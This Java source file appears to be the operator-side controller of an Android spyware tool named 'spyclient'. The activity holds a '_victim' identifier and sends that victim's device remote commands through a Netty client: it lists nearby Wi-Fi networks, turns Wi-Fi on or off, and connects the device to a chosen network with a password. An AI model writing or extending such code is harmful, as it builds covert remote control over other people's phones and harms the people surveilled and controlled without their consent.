package slade.carter.spyclient;

import android.content.DialogInterface;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import org.json.simple.JSONArray;

public class WifiManagerActivity extends AppCompatActivity {

    private static WifiManagerActivity _instance;
    private String _victim;
    private EditText _passwordEditText;
    private Button _wifiOnButton;
    private Button _wifiOffButton;
    private ListView _wifiListView;

    public static WifiManagerActivity getInstance() {
        return _instance;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_wifi_manager);
        _instance = this;
        _victim = getIntent().getStringExtra("victim");
        _passwordEditText = (EditText) findViewById(R.id.passwordEditText);
        _wifiOnButton = (Button) findViewById(R.id.wifiOnbutton);
        _wifiOffButton = (Button) findViewById(R.id.wifiOffbutton);
        _wifiListView = (ListView) findViewById(R.id.wifiListView);

        NettyClient.getInstance().sendGetWifiList(_victim);
        initListeners();
    }

    private void initListeners() {
        _wifiOnButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                NettyClient.getInstance().sendSetWifiEnabled(true, _victim);
            }
        });

        _wifiOffButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                NettyClient.getInstance().sendSetWifiEnabled(false, _victim);
            }
        });

        _wifiListView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                String wifiSsid = ((TextView) view).getText().toString();
                String password = _passwordEditText.getText().toString();
                if (password.trim().isEmpty()) return;
                NettyClient.getInstance().sendWifiConnect(wifiSsid, password, _victim);
            }
        });
    }

    public void initWifiList(JSONArray wifiList) {
        if (wifiList.size() == 0) {
            Toast.makeText(this, "Wifi сети не найдены!", Toast.LENGTH_LONG).show();
        }
        _wifiListView.setVisibility(View.VISIBLE);
        String[] list = new String[wifiList.size()];
        for (int i = 0; i < wifiList.size(); i++)
            list[i] = (String) wifiList.get(i);
        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, list);
        // присваиваем адаптер списку
        _wifiListView.setAdapter(adapter);
    }
}
